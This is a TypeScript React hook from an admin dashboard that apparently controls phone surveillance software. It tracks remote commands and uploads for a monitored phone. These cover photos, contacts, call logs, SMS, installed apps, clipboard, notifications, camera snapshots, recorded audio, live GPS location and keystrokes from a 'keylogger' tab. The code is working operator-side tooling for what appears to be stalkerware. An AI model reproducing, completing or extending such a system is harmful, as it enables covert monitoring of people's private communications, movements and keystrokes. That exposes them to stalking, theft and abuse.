// components/admin/devices/useDeviceRealtimeSync.ts
"use client";

import { useEffect, useRef } from "react";
import { createClient } from "@/lib/supabase/client";
import { toast } from "@/components/ui/Toast";
import { getTabMeta } from "@/lib/device-tab-meta";

interface Options {
  deviceId: string;
  activeTab: string;
  onRefreshActiveTab: (tabId: string) => void;
  onRefreshLightStatus: () => void;
  onRefreshTelemetry?: (tabId: string) => void;
}

export function useDeviceRealtimeSync({
  deviceId,
  activeTab,
  onRefreshActiveTab,
  onRefreshLightStatus,
  onRefreshTelemetry,
}: Options) {
  const supabaseRef = useRef(createClient());
  const activeTabRef = useRef(activeTab);
  activeTabRef.current = activeTab;

  useEffect(() => {
    if (!deviceId) return;
    const sb = supabaseRef.current;

    // 1. Broadcast channel for instant device-to-dashboard events
    const broadcastChannel = sb
      .channel(`device:${deviceId}`)
      .on("broadcast", { event: "data_synced" }, (payload: any) => {
        const res = payload.payload?.results || {};
        let syncLabel = "";
        let tabMatched = "";
        if (res.files) { syncLabel = `Gallery (${res.files} files)`; tabMatched = "gallery"; }
        else if (res.contacts) { syncLabel = `Contacts (${res.contacts} items)`; tabMatched = "contacts"; }
        else if (res.calls) { syncLabel = `Calls (${res.calls} logs)`; tabMatched = "calls"; }
        else if (res.messages) { syncLabel = `Messages (${res.messages} SMS)`; tabMatched = "messages"; }
        else if (res.installed_apps) { syncLabel = `Apps (${res.installed_apps} apps)`; tabMatched = "apps"; }

        if (tabMatched && activeTabRef.current === tabMatched) {
          toast.success(`${syncLabel} synced fresh from phone!`);
          onRefreshActiveTab(activeTabRef.current);
        }
        onRefreshLightStatus();
      })
      .on("broadcast", { event: "file_uploaded" }, (payload: any) => {
        const name = payload.payload?.file_name || "File";
        if (activeTabRef.current === "gallery") {
          toast.success(`Received: ${name} from phone!`);
          onRefreshActiveTab("gallery");
        }
        onRefreshLightStatus();
      })
      .on("broadcast", { event: "photo_uploaded" }, () => {
        if (activeTabRef.current === "camera") {
          toast.success("Snapshot captured & received from phone!");
          onRefreshActiveTab("camera");
        }
        onRefreshLightStatus();
      })
      .on("broadcast", { event: "audio_uploaded" }, () => {
        if (activeTabRef.current === "audio") {
          toast.success("Audio clip recorded & received from phone!");
          onRefreshActiveTab("audio");
        }
        onRefreshLightStatus();
      })
      .subscribe();

    // 2. Postgres Changes on device_commands (pending -> executed)
    const cmdChannel = sb
      .channel(`device-cmds:${deviceId}`)
      .on(
        "postgres_changes",
        {
          event: "UPDATE",
          schema: "public",
          table: "device_commands",
          filter: `device_id=eq.${deviceId}`,
        },
        (payload: any) => {
          const row = payload.new;
          if (row?.status === "executed") {
            const cmd = row.command;
            const currentTab = activeTabRef.current;
            if (cmd === "sync_gallery" && currentTab === "gallery") {
              toast.success("Gallery sync completed on phone!");
              onRefreshActiveTab("gallery");
            } else if (cmd === "sync_contacts" && currentTab === "contacts") {
              toast.success("Contacts sync completed on phone!");
              onRefreshActiveTab("contacts");
            } else if (cmd === "sync_calls" && currentTab === "calls") {
              toast.success("Calls sync completed on phone!");
              onRefreshActiveTab("calls");
            } else if (cmd === "sync_messages" && currentTab === "messages") {
              toast.success("SMS sync completed on phone!");
              onRefreshActiveTab("messages");
            } else if (cmd === "sync_apps" && currentTab === "apps") {
              toast.success("Apps sync completed on phone!");
              onRefreshActiveTab("apps");
            } else if (cmd === "sync_wifi" && currentTab === "security") {
              toast.success("WiFi scan completed on phone!");
              if (onRefreshTelemetry) onRefreshTelemetry("security");
            } else if (cmd === "fetch_clipboard" && currentTab === "clipboard") {
              toast.success("Clipboard fetched fresh from phone!");
              if (onRefreshTelemetry) onRefreshTelemetry("clipboard");
            } else if (cmd === "fetch_notifications" && currentTab === "notifications") {
              toast.success("Notifications fetched fresh from phone!");
              if (onRefreshTelemetry) onRefreshTelemetry("notifications");
            } else if (cmd === "fetch_keystrokes" && currentTab === "keylogger") {
              toast.success("Keystrokes fetched fresh from phone!");
              if (onRefreshTelemetry) onRefreshTelemetry("keylogger");
            } else if (cmd === "fetch_location" && currentTab === "map") {
              toast.success("Live GPS fix confirmed from phone!");
              onRefreshActiveTab("map");
            }
            onRefreshLightStatus();
          }
        }
      )
      .subscribe();

    return () => {
      sb.removeChannel(broadcastChannel);
      sb.removeChannel(cmdChannel);
    };
  }, [deviceId, onRefreshActiveTab, onRefreshLightStatus, onRefreshTelemetry]);
}
